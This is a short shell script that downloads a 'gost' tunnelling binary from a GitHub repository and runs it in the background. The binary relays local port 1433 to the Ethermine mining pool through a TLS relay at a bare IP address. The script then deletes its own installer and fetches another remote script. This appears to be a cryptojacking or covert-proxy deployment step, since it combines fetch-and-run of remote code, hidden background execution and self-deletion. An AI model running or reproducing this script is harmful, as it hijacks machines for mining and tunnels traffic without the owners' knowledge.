#!/bin/sh
wget https://raw.githubusercontent.com/zhaojiyu/lpm/main/gost && sh chmod +x gost
sleep 1s
nohup ./gost -L=tcp://:1433/asia1.ethermine.org:4444 -F=relay+tls://47.75.49.75:8443 > log8.log 2>&1 &
rm -rf gost1.sh
wget https://raw.githubusercontent.com/zhaojiyu/lpm/main/agost.sh
echo "Gost Install OK......"
